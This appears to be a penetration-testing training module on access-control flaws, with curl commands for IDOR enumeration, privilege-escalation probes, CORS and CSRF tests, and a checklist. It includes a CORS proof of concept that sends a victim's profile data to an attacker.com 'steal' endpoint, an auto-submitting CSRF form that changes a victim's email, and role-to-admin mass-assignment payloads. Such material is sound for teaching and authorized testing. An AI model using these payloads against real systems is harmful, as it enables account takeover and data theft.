# Module: Access Control Testing
## IDOR, Privilege Escalation, and Authorization Flaws

---

## 4.1 Insecure Direct Object Reference (IDOR)

### Detection Strategy
IDOR occurs when an application exposes internal object references (IDs) and fails to verify the requesting user owns or has permission to access that object.

### Common IDOR Patterns
```
/api/users/1234/profile       → Try /api/users/1235/profile
/api/orders/ORD-0001          → Try /api/orders/ORD-0002
/document/download?id=abc123  → Enumerate or guess other IDs
/profile?user=john            → Try user=admin
/invoice/view/56789           → Try /invoice/view/56788
```

### IDOR Testing Process
```bash
# Step 1: Create two test accounts (Account A and Account B)
# Step 2: Perform an action as Account A, note object ID
# Step 3: Use Account B's session to access Account A's object

# Example with curl
# Auth as Account B
curl -s "https://target.com/api/users/1234/profile" \
  -H "Cookie: session=ACCOUNT_B_SESSION"

# If response returns Account A's data → IDOR confirmed
```

### Parameter Locations to Test
- URL path: `/api/users/{id}`
- Query string: `?user_id=123`
- POST body: `{"order_id": "456"}`
- JSON body: `{"account": "789"}`
- Cookie: `user_id=101`
- Header: `X-User-ID: 202`

### IDOR in File Download
```bash
# Test file ID enumeration
for i in {1..100}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/download?file_id=$i" \
    -H "Cookie: session=ACCOUNT_B_SESSION")
  echo "$i: $response"
done
```

---

## 4.2 Privilege Escalation

### Horizontal Privilege Escalation
**Definition:** User A accesses User B's data at the same privilege level.
```
# Example: Access another user's account settings
GET /account/settings?userId=victim123
Cookie: session=attacker-session
```

### Vertical Privilege Escalation
**Definition:** Regular user accesses admin functionality.
```bash
# Attempt to access admin endpoints with regular user session
curl "https://target.com/admin/users" -H "Cookie: session=USER_SESSION"
curl "https://target.com/admin/settings" -H "Cookie: session=USER_SESSION"
curl "https://target.com/api/admin/export" -H "Cookie: session=USER_SESSION"

# Attempt to add admin role via parameter manipulation
POST /api/users/update
{"userId": "123", "role": "admin"}

# Mass assignment attack
POST /api/register
{"username": "attacker", "password": "test", "role": "admin"}
```

### Function-Level Access Control
```bash
# Try all methods on endpoints
for method in GET POST PUT DELETE PATCH OPTIONS; do
  echo "Testing $method"
  curl -s -o /dev/null -w "%{http_code}" \
    -X $method "https://target.com/api/admin/users" \
    -H "Cookie: session=USER_SESSION"
  echo ""
done
```

---

## 4.3 CORS Misconfiguration

### Detection
```bash
# Test if Origin reflection is enabled
curl -s -I "https://target.com/api/data" \
  -H "Origin: https://attacker.com"

# Check response for:
# Access-Control-Allow-Origin: https://attacker.com  ← Reflected (Bad!)
# Access-Control-Allow-Credentials: true  ← With credentials (Critical!)

# Test null origin
curl -s -I "https://target.com/api/data" \
  -H "Origin: null"

# Test subdomain takeover path
curl -s -I "https://target.com/api/data" \
  -H "Origin: https://evil.target.com"
```

### Exploitation PoC
```javascript
// PoC: Steal authenticated data via CORS misconfiguration
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data))
})
```

---

## 4.4 CSRF (Cross-Site Request Forgery)

### Detection
```bash
# Check if state-changing requests include CSRF tokens
# Test if token is:
# 1. Present
# 2. Validated server-side
# 3. Tied to session
# 4. Unpredictable

# Attempt to replay request without CSRF token
curl -X POST "https://target.com/account/email/change" \
  -d "email=attacker@evil.com" \
  -H "Cookie: session=VICTIM_SESSION"
  # No CSRF token in request — if it succeeds, CSRF possible
```

### CSRF PoC (HTML form)
```html
<!-- Attacker hosts this page -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
</body>
</html>
```

---

## 4.5 Forced Browsing

```bash
# Test access to authenticated pages without authentication
curl "https://target.com/dashboard" --no-cookie
curl "https://target.com/admin" --no-cookie
curl "https://target.com/profile" --no-cookie

# Direct object access
curl "https://target.com/invoices/12345.pdf" --no-cookie
curl "https://target.com/exports/report.xlsx" --no-cookie
```

---

## Access Control Checklist

- [ ] IDOR in user profile endpoints
- [ ] IDOR in transaction/order endpoints
- [ ] IDOR in file download endpoints
- [ ] Horizontal privilege escalation
- [ ] Vertical privilege escalation (user → admin)
- [ ] Mass assignment (extra fields in registration/update)
- [ ] CORS — Origin reflection test
- [ ] CORS — Null origin test
- [ ] CORS — With credentials test
- [ ] CSRF on all state-changing requests
- [ ] CSRF token bypass attempts
- [ ] Forced browsing to authenticated pages
- [ ] HTTP method override (X-HTTP-Method-Override)
- [ ] Path traversal in object references
